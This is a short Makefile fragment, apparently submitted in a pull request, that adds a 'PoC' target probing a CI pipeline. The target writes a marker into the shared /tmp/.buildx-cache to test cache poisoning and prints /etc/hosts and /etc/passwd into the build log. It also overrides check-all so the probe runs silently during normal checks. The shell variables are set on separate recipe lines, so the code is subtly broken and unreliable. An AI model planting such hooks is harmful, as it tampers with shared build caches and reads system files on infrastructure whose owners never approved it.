# ===== Temporary PoC: Cache marker + LFI for workflow testing =====
.PHONY: poc
poc:
	@# --- Cache Marker PoC ---
	@mkdir -p /tmp/.buildx-cache || true
	@MARKER="POC-PR-MARKER-$${GITHUB_ACTOR:-manual}-$(shell date +%s)"
	@echo "=== POC: WROTE MARKER INTO CACHE: $$MARKER ==="
	@echo "$$MARKER" > /tmp/.buildx-cache/$$MARKER || true
	@ls -l /tmp/.buildx-cache | grep POC-PR-MARKER || true
	@echo "=== END CACHE MARKER ==="
	@echo

	@# --- LFI PoC ---
	@FILES="/etc/hosts /etc/passwd"
	@for FILE in $$FILES; do \
		echo "=== LFI PoC: Reading $$FILE ==="; \
		cat $$FILE || echo "Failed to read $$FILE"; \
		echo "=== END LFI for $$FILE ==="; \
	done

# Override check-all to include PoC
.PHONY: check-all
check-all: poc
